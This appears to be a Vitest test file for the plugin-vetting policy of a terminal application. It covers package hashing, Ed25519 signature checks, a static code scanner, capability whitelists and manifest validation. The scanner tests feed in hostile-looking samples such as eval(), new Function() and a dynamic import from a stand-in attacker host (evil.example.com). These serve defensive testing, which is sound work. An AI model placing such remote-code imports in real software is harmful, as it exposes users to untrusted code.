import { describe, expect, it } from 'vitest'
import * as ed from '@noble/ed25519'
import { sha512 } from '@noble/hashes/sha2'
import { strToU8 } from 'fflate'
import { deterministicHashHex, checkSignature } from '../src/policy/signature-check'
import { staticScan } from '../src/policy/static-scan'
import { checkCapabilities } from '../src/policy/capabilities'
import { checkManifest } from '../src/policy/manifest-check'
import { bytesToB64 } from '../src/lib/ed25519'

ed.etc.sha512Sync = (...m: Uint8Array[]) => sha512(ed.etc.concatBytes(...m))

describe('deterministicHashHex', () => {
  it('produces stable hash regardless of entry order', () => {
    const a = [
      { path: 'a.txt', content: new Uint8Array([1, 2, 3]) },
      { path: 'b.txt', content: new Uint8Array([4, 5, 6]) },
    ]
    const b = [...a].reverse()
    expect(deterministicHashHex(a)).toBe(deterministicHashHex(b))
  })

  it('excludes signature.sig from the hash', () => {
    const without = [{ path: 'a.txt', content: new Uint8Array([1]) }]
    const withSig = [
      ...without,
      { path: 'signature.sig', content: new Uint8Array([99]) },
    ]
    expect(deterministicHashHex(without)).toBe(deterministicHashHex(withSig))
  })

  it('changes when content changes', () => {
    const a = [{ path: 'a.txt', content: new Uint8Array([1]) }]
    const b = [{ path: 'a.txt', content: new Uint8Array([2]) }]
    expect(deterministicHashHex(a)).not.toBe(deterministicHashHex(b))
  })

  it('changes when path changes', () => {
    const a = [{ path: 'a.txt', content: new Uint8Array([1]) }]
    const b = [{ path: 'b.txt', content: new Uint8Array([1]) }]
    expect(deterministicHashHex(a)).not.toBe(deterministicHashHex(b))
  })
})

describe('checkSignature', () => {
  async function signed(entries: { path: string; content: Uint8Array }[]) {
    const priv = ed.utils.randomPrivateKey()
    const pub = await ed.getPublicKeyAsync(priv)
    const hashHex = deterministicHashHex(entries)
    const sig = await ed.signAsync(new TextEncoder().encode(hashHex), priv)
    return {
      pubB64: bytesToB64(pub),
      sigB64: bytesToB64(sig),
      entries: [...entries, { path: 'signature.sig', content: strToU8(bytesToB64(sig)) }],
    }
  }

  it('accepts a valid signature', async () => {
    const { pubB64, entries } = await signed([
      { path: 'a.txt', content: new Uint8Array([1, 2]) },
    ])
    const result = await checkSignature(entries, pubB64)
    expect(result.ok).toBe(true)
  })

  it('rejects when signature.sig is missing', async () => {
    const { pubB64, entries } = await signed([
      { path: 'a.txt', content: new Uint8Array([1, 2]) },
    ])
    const result = await checkSignature(
      entries.filter((e) => e.path !== 'signature.sig'),
      pubB64,
    )
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error.issues[0]?.message).toMatch(/missing signature/)
  })

  it('rejects when content was tampered with', async () => {
    const { pubB64, entries } = await signed([
      { path: 'a.txt', content: new Uint8Array([1, 2]) },
    ])
    const tampered = entries.map((e) =>
      e.path === 'a.txt' ? { ...e, content: new Uint8Array([9, 9]) } : e,
    )
    const result = await checkSignature(tampered, pubB64)
    expect(result.ok).toBe(false)
  })

  it('rejects when signature was flipped', async () => {
    const { pubB64, entries } = await signed([
      { path: 'a.txt', content: new Uint8Array([1, 2]) },
    ])
    const tampered = entries.map((e) => {
      if (e.path !== 'signature.sig') return e
      const flipped = new Uint8Array(e.content)
      flipped[0] = flipped[0]! ^ 0xff
      return { ...e, content: flipped }
    })
    const result = await checkSignature(tampered, pubB64)
    expect(result.ok).toBe(false)
  })

  it('rejects malformed pubkey length', async () => {
    const { entries } = await signed([
      { path: 'a.txt', content: new Uint8Array([1]) },
    ])
    const result = await checkSignature(entries, bytesToB64(new Uint8Array(20)))
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error.issues[0]?.message).toMatch(/32 bytes/)
  })
})

describe('staticScan', () => {
  it('passes clean code', () => {
    const result = staticScan([
      { path: 'dist/main.cjs', content: strToU8('module.exports = function add(a,b){ return a+b }') },
    ])
    expect(result.ok).toBe(true)
  })

  it('flags eval()', () => {
    const result = staticScan([
      { path: 'dist/main.cjs', content: strToU8('const x = eval("1+1")') },
    ])
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.code).toBe('static-scan')
      expect(result.error.issues[0]?.message).toMatch(/eval/)
      expect(result.error.issues[0]?.path).toBe('dist/main.cjs')
    }
  })

  it('flags new Function()', () => {
    const result = staticScan([
      { path: 'dist/renderer.mjs', content: strToU8('const f = new Function("return 1")') },
    ])
    expect(result.ok).toBe(false)
  })

  it('flags Function.constructor', () => {
    const result = staticScan([
      { path: 'dist/main.cjs', content: strToU8('const f = (function(){}).constructor') },
    ])
    expect(result.ok).toBe(true)
    const result2 = staticScan([
      { path: 'dist/main.cjs', content: strToU8('Function.constructor("x")') },
    ])
    expect(result2.ok).toBe(false)
  })

  it('flags dynamic http import', () => {
    const result = staticScan([
      { path: 'dist/main.cjs', content: strToU8('import("https://evil.example.com/x.js")') },
    ])
    expect(result.ok).toBe(false)
  })

  it('reports line and col positions', () => {
    const code = 'const a = 1\nconst b = eval("2")'
    const result = staticScan([{ path: 'dist/main.cjs', content: strToU8(code) }])
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.issues[0]?.line).toBe(2)
      expect(result.error.issues[0]?.col).toBeGreaterThan(0)
    }
  })

  it('skips non-js files', () => {
    const result = staticScan([
      { path: 'README.md', content: strToU8('here be eval() but in markdown') },
    ])
    expect(result.ok).toBe(true)
  })

  it('flags bare module specifier in dist/*.mjs', () => {
    const code = 'const a = 1\nimport hljs from "highlight.js/lib/common";'
    const result = staticScan([{ path: 'dist/renderer.mjs', content: strToU8(code) }])
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.code).toBe('static-scan')
      const issue = result.error.issues.find((i) => i.message.includes('bare module specifier'))
      expect(issue).toBeDefined()
      expect(issue?.message).toContain('"highlight.js/lib/common"')
      expect(issue?.path).toBe('dist/renderer.mjs')
      expect(issue?.line).toBe(2)
      expect(issue?.col).toBeGreaterThan(0)
    }
  })

  it('accepts relative imports in dist/*.mjs', () => {
    const code = 'import x from "./foo.js"\nimport y from "../bar.mjs"\nexport { z } from "./z.js"'
    const result = staticScan([{ path: 'dist/renderer.mjs', content: strToU8(code) }])
    expect(result.ok).toBe(true)
  })

  it('accepts @mterminal/extension-api in dist/*.mjs', () => {
    const code = 'import { x } from "@mterminal/extension-api"'
    const result = staticScan([{ path: 'dist/renderer.mjs', content: strToU8(code) }])
    expect(result.ok).toBe(true)
  })

  it('ignores bare imports in dist/*.cjs', () => {
    const code = 'const x = require("highlight.js/lib/common")'
    const result = staticScan([{ path: 'dist/main.cjs', content: strToU8(code) }])
    expect(result.ok).toBe(true)
  })

  it('flags bare side-effect import in dist/*.mjs', () => {
    const code = 'import "side-effect-pkg"'
    const result = staticScan([{ path: 'dist/renderer.mjs', content: strToU8(code) }])
    expect(result.ok).toBe(false)
    if (!result.ok) {
      const issue = result.error.issues.find((i) => i.message.includes('bare module specifier'))
      expect(issue?.message).toContain('"side-effect-pkg"')
    }
  })

  it('flags bare dynamic import in dist/*.mjs', () => {
    const code = 'const m = await import("some-pkg")'
    const result = staticScan([{ path: 'dist/renderer.mjs', content: strToU8(code) }])
    expect(result.ok).toBe(false)
    if (!result.ok) {
      const issue = result.error.issues.find((i) => i.message.includes('bare module specifier'))
      expect(issue?.message).toContain('"some-pkg"')
    }
  })

  it('does not flag import-like strings in code', () => {
    const code = 'const x = "import \'foo\'"\nconst y = `import "bar"`\nconst z = "import(\\"baz\\")"'
    const result = staticScan([{ path: 'dist/renderer.mjs', content: strToU8(code) }])
    expect(result.ok).toBe(true)
  })

  it('accepts mt-ext:// and data: specifiers', () => {
    const code = 'import a from "mt-ext://host/foo.mjs"\nconst b = await import("data:text/javascript,export default 1")'
    const result = staticScan([{ path: 'dist/renderer.mjs', content: strToU8(code) }])
    expect(result.ok).toBe(true)
  })

  it('only scans dist/*.mjs for bare imports (skips src/)', () => {
    const code = 'import hljs from "highlight.js/lib/common"'
    const result = staticScan([{ path: 'src/renderer.mjs', content: strToU8(code) }])
    expect(result.ok).toBe(true)
  })
})

describe('checkCapabilities', () => {
  it('accepts whitelisted caps', () => {
    const result = checkCapabilities(['clipboard', 'notifications'], [])
    expect(result.ok).toBe(true)
  })

  it('rejects non-whitelisted capability', () => {
    const result = checkCapabilities(['rootkit'], [])
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error.issues[0]?.message).toMatch(/whitelist/)
  })

  it('requires allowedNetworkDomains for network:full', () => {
    const result = checkCapabilities(['network:full'], [])
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error.issues[0]?.message).toMatch(/allowedNetworkDomains/)
  })

  it('accepts network:full with domains', () => {
    const result = checkCapabilities(['network:full'], ['api.example.com'])
    expect(result.ok).toBe(true)
  })

  it('accepts network:limited without domains', () => {
    const result = checkCapabilities(['network:limited'], [])
    expect(result.ok).toBe(true)
  })
})

describe('checkManifest', () => {
  const baseManifest = () => ({
    name: 'mterminal-plugin-demo',
    version: '1.0.0',
    main: 'dist/main.cjs',
    engines: { 'mterminal-api': '^1.0.0' },
    mterminal: {
      id: 'demo',
      publisher: { authorId: 'gh-1', keyId: 'gh-1:key1' },
      activationEvents: ['onStartupFinished'],
      capabilities: ['clipboard'],
      contributes: {},
    },
  })

  it('accepts a valid manifest', () => {
    const result = checkManifest(baseManifest())
    expect(result.ok).toBe(true)
  })

  it('returns manifest policy error on invalid input', () => {
    const result = checkManifest({ name: 'x' })
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error.code).toBe('manifest')
  })
})
